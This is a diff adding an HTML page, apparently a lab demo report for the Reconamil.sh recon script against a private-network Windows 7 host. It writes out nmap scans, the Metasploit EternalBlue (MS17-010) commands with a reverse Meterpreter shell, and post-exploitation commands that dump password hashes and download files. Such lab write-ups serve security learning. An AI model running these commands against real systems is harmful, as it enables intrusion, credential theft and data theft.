@@ -1,0 +1,134 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Reconamil.sh - Practical Use Case & Exploit Report</title>
+<style>
+    body { font-family: "Segoe UI", Tahoma, sans-serif; background:#f9f9f9; color:#333; margin:0; }
+    header { background: linear-gradient(90deg, #0d47a1, #1976d2); color:white; padding:20px; text-align:center; }
+    main { max-width: 950px; margin:30px auto; background:white; border-radius:8px; box-shadow:0 0 20px rgba(0,0,0,0.1); padding:30px; }
+    h1, h2, h3 { color: #0d47a1; }
+    code, pre { background:#272822; color:#f8f8f2; padding:10px; border-radius:6px; display:block; overflow-x:auto; }
+    section { margin-bottom:40px; }
+    ul { list-style: disc; margin-left:20px; }
+    footer { text-align:center; font-size:0.9em; color:#777; margin-top:40px; }
+</style>
+</head>
+<body>
+<header>
+  <h1>🔍 Reconamil.sh - Professional Recon & Exploit Demo</h1>
+  <p>Step-by-step scanning, enumeration & exploitation on Windows 7 SP1 (MS17-010)</p>
+</header>
+<main>
+<section>
+<h2>✅ Objective</h2>
+<p>Showcase how <strong>Reconamil.sh</strong> automates recon and helps identify vulnerabilities, leading to successful exploitation of <strong>MS17-010 (EternalBlue)</strong> on a Windows 7 SP1 system.</p>
+</section>
+
+<section>
+<h2>⚙️ Step 1: Scanning & Enumeration</h2>
+<p>Used <code>Reconamil.sh</code> script to scan target:</p>
+<pre>
+git clone https://github.com/ravisairockey/Recon-Racket
+cd Recon-Racket
+chmod +x Reconamil.sh
+./Reconamil.sh -t 192.168.2.134 -r -p "1-65535"
+</pre>
+<p>Reconamil.sh performed:</p>
+<ul>
+  <li>Port scanning with <code>nmap</code></li>
+  <li>Vulnerability scan: <code>nikto</code>, <code>wpscan</code></li>
+  <li>Subdomain & service discovery (via <code>subfinder</code> & <code>amass</code>)</li>
+</ul>
+<p>Saved HTML and text reports to <code>logs/</code>.</p>
+</section>
+
+<section>
+<h2>📋 Scan Result Snapshot</h2>
+<p>Below is actual output captured:</p>
+<pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 04:46 EDT
+Nmap scan report for 192.168.2.134
+Host is up (0.00013s latency).
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1
+5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0
+49152/tcp open  msrpc        Microsoft Windows RPC
+...
+Host script results:
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   message_signing: disabled (dangerous)
+| smb-os-discovery:
+|   OS: Windows 7 Ultimate 7601 Service Pack 1
+|   Computer name: WIN-845Q99004PP
+|   Workgroup: WORKGROUP
+</pre>
+</section>
+
+<section>
+<h2>🚀 Step 2: Vulnerability Confirmation</h2>
+<p>Ran NSE script to confirm MS17-010:</p>
+<pre>nmap -p445 --script smb-vuln-ms17-010 192.168.2.134</pre>
+<p>Result: <strong>Target is vulnerable!</strong></p>
+</section>
+
+<section>
+<h2>💥 Step 3: Exploitation (Metasploit)</h2>
+<p>Used EternalBlue exploit module:</p>
+<pre>
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.2.134
+set LHOST 192.168.2.131
+set LPORT 4444
+exploit
+</pre>
+<p>Gained <code>Meterpreter</code> shell with SYSTEM privileges:</p>
+<pre>
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+</pre>
+</section>
+
+<section>
+<h2>🔑 Step 4: Post-Exploitation</h2>
+<ul>
+  <li>Dumped password hashes: <code>hashdump</code></li>
+  <li>Captured screenshots: <code>screenshot</code></li>
+  <li>Downloaded sensitive docs: <code>download</code></li>
+  <li>Explored processes & users</li>
+</ul>
+<pre>
+meterpreter > ps
+meterpreter > hashdump
+meterpreter > screenshot
+meterpreter > download C:\Users\Administrator\Desktop\secrets.docx
+</pre>
+</section>
+
+<section>
+<h2>📦 Tools Used</h2>
+<ul>
+  <li><strong>Reconamil.sh</strong> (automates recon & scan)</li>
+  <li><strong>Nmap</strong> for vuln & service scan</li>
+  <li><strong>Metasploit Framework</strong> for exploit</li>
+  <li>Post-exploitation: Meterpreter commands</li>
+</ul>
+</section>
+
+<section>
+<h2>✅ Conclusion</h2>
+<p>Demonstrated a real-world use case: how Reconamil.sh speeds up recon & scanning to find critical vulnerabilities, leading to successful exploitation and post-exploitation on Windows 7.</p>
+</section>
+</main>
+<footer>
+<p>Created by @AmilRSV | Project: <a href="https://github.com/ravisairockey/Recon-Racket" target="_blank">Recon-Racket</a></p>
+</footer>
+</body>
+</html>
